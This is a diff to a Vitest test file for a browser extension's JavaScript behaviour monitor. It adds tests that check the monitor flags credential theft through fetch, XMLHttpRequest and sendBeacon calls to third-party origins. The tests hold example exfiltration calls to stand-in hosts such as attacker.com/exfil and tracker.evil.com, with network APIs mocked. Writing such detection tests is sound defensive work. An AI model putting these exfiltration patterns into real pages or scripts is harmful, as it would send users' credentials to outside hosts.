@@ -1,5 +1,5 @@
 // @vitest-environment happy-dom
-import { describe, expect, it, beforeEach, vi } from "vitest";
+import { describe, expect, it, beforeAll, beforeEach, vi } from "vitest";
 import {
   formHasCredentialFields,
   isCrossOriginUrl,
@@ -12,6 +12,13 @@ import {
   initJsBehaviorMonitor,
   _resetState,
 } from "../extension/src/content/js_behavior_monitor";
+
+// Stub network APIs before any test calls initJsBehaviorMonitor (which patches them).
+// The patches wrap whatever is at window.fetch/navigator.sendBeacon at init time.
+beforeAll(() => {
+  window.fetch = vi.fn().mockResolvedValue(new Response()) as unknown as typeof window.fetch;
+  navigator.sendBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
+});
 
 beforeEach(() => {
   _resetState();
@@ -405,5 +412,146 @@ describe("credential field value monitoring", () => {
     void input.value;
 
     expect(postSignal).not.toHaveBeenCalled();
+  });
+});
+
+describe("network exfiltration monitoring – fetch", () => {
+  it("emits exfil signal when fetch to 3P correlates with credential form submit", () => {
+    const postSignal = vi.fn();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    const form = document.createElement("form");
+    form.action = "https://evil.com/steal";
+    const pw = document.createElement("input");
+    pw.type = "password";
+    form.appendChild(pw);
+    document.body.appendChild(form);
+
+    form.dispatchEvent(new Event("submit", { bubbles: true }));
+
+    window.fetch("https://attacker.com/exfil", { method: "POST" });
+
+    expect(postSignal).toHaveBeenCalledWith(
+      "ns-js-exfil-network",
+      expect.objectContaining({
+        api: "fetch",
+        destinationOrigin: "https://attacker.com",
+      })
+    );
+  });
+
+  it("does not emit exfil signal for same-origin fetch", () => {
+    const postSignal = vi.fn();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    const form = document.createElement("form");
+    form.action = "https://evil.com/steal";
+    const pw = document.createElement("input");
+    pw.type = "password";
+    form.appendChild(pw);
+    document.body.appendChild(form);
+
+    form.dispatchEvent(new Event("submit", { bubbles: true }));
+
+    window.fetch("/api/data", { method: "POST" });
+
+    const exfilCalls = postSignal.mock.calls.filter(
+      (c: [string, unknown]) => c[0] === "ns-js-exfil-network"
+    );
+    expect(exfilCalls).toHaveLength(0);
+  });
+
+  it("does not emit exfil signal when not correlated with submit", () => {
+    const postSignal = vi.fn();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    window.fetch("https://cdn.example.com/data.json");
+
+    const exfilCalls = postSignal.mock.calls.filter(
+      (c: [string, unknown]) => c[0] === "ns-js-exfil-network"
+    );
+    expect(exfilCalls).toHaveLength(0);
+  });
+});
+
+describe("network exfiltration monitoring – XHR", () => {
+  it("emits exfil signal when XHR to 3P correlates with credential form submit", () => {
+    const postSignal = vi.fn();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    const form = document.createElement("form");
+    form.action = "https://evil.com/steal";
+    const pw = document.createElement("input");
+    pw.type = "password";
+    form.appendChild(pw);
+    document.body.appendChild(form);
+
+    form.dispatchEvent(new Event("submit", { bubbles: true }));
+
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://attacker.com/collect");
+    xhr.send("data");
+
+    expect(postSignal).toHaveBeenCalledWith(
+      "ns-js-exfil-network",
+      expect.objectContaining({
+        api: "xhr",
+        destinationOrigin: "https://attacker.com",
+      })
+    );
+  });
+});
+
+describe("network exfiltration monitoring – beacon", () => {
+  it("emits beacon signal when sendBeacon to 3P on credential page", () => {
+    const postSignal = vi.fn();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    const form = document.createElement("form");
+    const pw = document.createElement("input");
+    pw.type = "password";
+    form.appendChild(pw);
+    document.body.appendChild(form);
+
+    navigator.sendBeacon("https://tracker.evil.com/collect", "payload");
+
+    expect(postSignal).toHaveBeenCalledWith(
+      "ns-js-exfil-beacon",
+      expect.objectContaining({
+        api: "beacon",
+        destinationOrigin: "https://tracker.evil.com",
+        credentialFieldsPresent: true,
+      })
+    );
+  });
+
+  it("does not emit beacon signal on non-credential page", () => {
+    const postSignal = vi.fn();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    navigator.sendBeacon("https://analytics.example.com/track", "data");
+
+    const beaconCalls = postSignal.mock.calls.filter(
+      (c: [string, unknown]) => c[0] === "ns-js-exfil-beacon"
+    );
+    expect(beaconCalls).toHaveLength(0);
+  });
+
+  it("does not emit beacon signal for same-origin", () => {
+    const postSignal = vi.fn();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    const form = document.createElement("form");
+    const pw = document.createElement("input");
+    pw.type = "password";
+    form.appendChild(pw);
+    document.body.appendChild(form);
+
+    navigator.sendBeacon("/internal/track", "data");
+
+    const beaconCalls = postSignal.mock.calls.filter(
+      (c: [string, unknown]) => c[0] === "ns-js-exfil-beacon"
+    );
+    expect(beaconCalls).toHaveLength(0);
   });
 });
